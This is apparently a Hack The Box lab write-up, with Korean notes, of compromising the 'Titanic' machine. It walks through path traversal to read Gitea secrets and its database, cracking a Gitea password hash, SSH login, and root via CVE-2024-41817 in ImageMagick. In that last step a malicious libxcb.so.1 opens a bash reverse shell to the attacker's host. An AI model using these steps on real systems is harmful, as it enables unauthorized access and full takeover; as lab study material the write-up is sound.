---
tags:
  - type/machine
  - platform/htb
  - os/linux
  - status/solved
  - tech/cred/crack
  - tech/enum/peas
  - tech/payload/revshell
type: machine
platform: htb
os: linux
ip: 10.129.7.50
domain: titanic.htb
ports: [22, 80]
services: [http, ssh]
cves: [CVE-2024-41817]
status: solved
tech_count: 3
---
## Nmap
```bash
┌──(kali㉿kali)-[~/HTB/Titanic]
└─$ nmap -sCV -p- -Pn -A --min-rate 5000 10.129.7.50 -oN nmap.log
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-12 22:47 +0900
Nmap scan report for 10.129.7.50
Host is up (0.22s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   223.19 ms 10.10.14.1
2   223.75 ms 10.129.7.50

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.58 seconds

```

dev.titanic.htb 접근 시 mysql 자격 증명 획득
![[Pasted image 20260312164059.png]]

gitea/docker-compose.yml 접근하여 /home/developer/gitea/data 경로 확인
해당 경로에 있는 app.ini 내용 확인하여 sqlite3, /data/gitea/gitea.db 파일 확인인

```bash
┌──(kali㉿kali)-[~/HTB/Titanic]
└─$ curl http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/conf/app.ini
APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea

[repository]
ROOT = /data/git/repositories

[repository.local]
LOCAL_COPY_PATH = /data/gitea/tmp/local-repo

[repository.upload]
TEMP_PATH = /data/gitea/uploads

[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER = file

[picture]
AVATAR_UPLOAD_PATH = /data/gitea/avatars
REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars

[attachment]
PATH = /data/gitea/attachments

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[service]
DISABLE_REGISTRATION = false
REQUIRE_SIGNIN_VIEW = false
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING = true
NO_REPLY_ADDRESS = noreply.localhost

[lfs]
PATH = /data/git/lfs

[mailer]
ENABLED = false

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

[cron.update_checker]
ENABLED = false

[repository.pull-request]
DEFAULT_MERGE_STYLE = merge

[repository.signing]
DEFAULT_TRUST_MODEL = committer

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g

```


DB파일 다운로드
```bash
┌──(kali㉿kali)-[~/HTB/Titanic]
└─$ curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -o gitea.db
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2036k 100  2036k   0     0 597450     0   0:00:03  0:00:03 --:--:-- 597382

```


sqlite3로 gitea.db 접근
```bash
┌──(kali㉿kali)-[~/HTB/Titanic]
└─$ sqlite3 gitea.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> 

```

user 테이블 조회하여 정보 획득
```sql
sqlite> select passwd,salt,name from user;
cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|2d149e5fbd1b20cf31db3e3c6a28fc9b|administrator
e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|8bf3e3452b78544f8bee9400d6936d34|developer

```

해시 덤프하여 평문 패스워드 획득`25282528`
```bash
┌──(kali㉿kali)-[~/HTB/Titanic]
└─$ wget https://raw.githubusercontent.com/hashcat/hashcat/refs/heads/master/tools/gitea2hashcat.py
--2026-03-12 23:07:36--  https://raw.githubusercontent.com/hashcat/hashcat/refs/heads/master/tools/gitea2hashcat.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2417 (2.4K) [text/plain]
Saving to: ‘gitea2hashcat.py’

gitea2hashcat.py             100%[==============================================>]   2.36K  --.-KB/s    in 0s      

2026-03-12 23:07:36 (57.6 MB/s) - ‘gitea2hashcat.py’ saved [2417/2417]

┌──(kali㉿kali)-[~/HTB/Titanic]
└─$ sqlite3 gitea.db 'select salt,passwd from user;' | python gitea2hashcat.py > hashes.txt

┌──(kali㉿kali)-[~/HTB/Titanic]
└─$ hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt --quiet
Hashfile 'hashes.txt' on line 1 ([+] Ru... mode 10900 (PBKDF2-HMAC-SHA256)): Separator unmatched
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528


```

ssh 접근
```bash
┌──(kali㉿kali)-[~/HTB/Titanic]
└─$ ssh developer@titanic.htb                                       
The authenticity of host 'titanic.htb (10.129.7.50)' can't be established.
ED25519 key fingerprint is: SHA256:Ku8uHj9CN/ZIoay7zsSmUDopgYkPmN7ugINXU0b2GEQ
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'titanic.htb' (ED25519) to the list of known hosts.
developer@titanic.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)


```

user.txt 획득
![[Pasted image 20260312165910.png]]

### Privilege Escalation

linpeas 실행 후 /opt/app/static/assets/images/metadata.log 파일이 수정
```bash
developer@titanic:/opt$ cat /opt/app/static/assets/images/metadata.log
/opt/app/static/assets/images/luxury-cabins.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 280817B 0.000u 0:00.003
/opt/app/static/assets/images/entertainment.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 291864B 0.000u 0:00.000
/opt/app/static/assets/images/home.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 232842B 0.000u 0:00.000
/opt/app/static/assets/images/exquisite-dining.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 280854B 0.000u 0:00.000

```

/opt/script 디렉토리 내 실행 파일 발견
```bash
developer@titanic:/opt$ tree
.
├── app
│   ├── app.py
│   ├── static
│   │   ├── assets
│   │   │   └── images
│   │   │       ├── entertainment.jpg
│   │   │       ├── exquisite-dining.jpg
│   │   │       ├── favicon.ico
│   │   │       ├── home.jpg
│   │   │       ├── luxury-cabins.jpg
│   │   │       └── metadata.log
│   │   └── styles.css
│   ├── templates
│   │   └── index.html
│   └── tickets
├── containerd  [error opening dir]
└── scripts
    └── identify_images.sh

```

해당 쉘 스크립트가 정보 수집 후 meatadata.log 생성
```bash
developer@titanic:/opt/scripts$ cat identify_images.sh 
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log

```

Imagemagick 버전 확인
```bash
developer@titanic:/opt/scripts$ /usr/bin/magick --version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)



```

ImageMagick 7.1.1-35에 arbitrary code execution 취약점 확인 (CVE-2024-41817)

 [https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)


poc 코드 실행
```bash
developer@titanic:~$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("bash -c 'sh -i >& /dev/tcp/10.10.14.42/4444 0>&1'");
    exit(0);
}
EOF

developer@titanic:~$ cp libxcb.so.1 /opt/app/static/assets/images/
```

1분 대기 후 리버스쉘 획득

```bash
┌──(kali㉿kali)-[~/HTB/Titanic]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.7.50] 46768
sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/root.txt
dc0d726a5316dc8ce8f48a09c5ece69a
# ifconfig
br-892511bece4a: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
        inet6 fe80::42:64ff:fe67:17b4  prefixlen 64  scopeid 0x20<link>
        ether 02:42:64:67:17:b4  txqueuelen 0  (Ethernet)
        RX packets 57948  bytes 21199960 (21.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 55426  bytes 9651628 (9.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:b1:e6:c7:03  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.7.50  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:fe94:73fa  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:fe94:73fa  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:73:fa  txqueuelen 1000  (Ethernet)
        RX packets 382375  bytes 30885944 (30.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 263817  bytes 49432552 (49.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

![[Pasted image 20260312171259.png]]

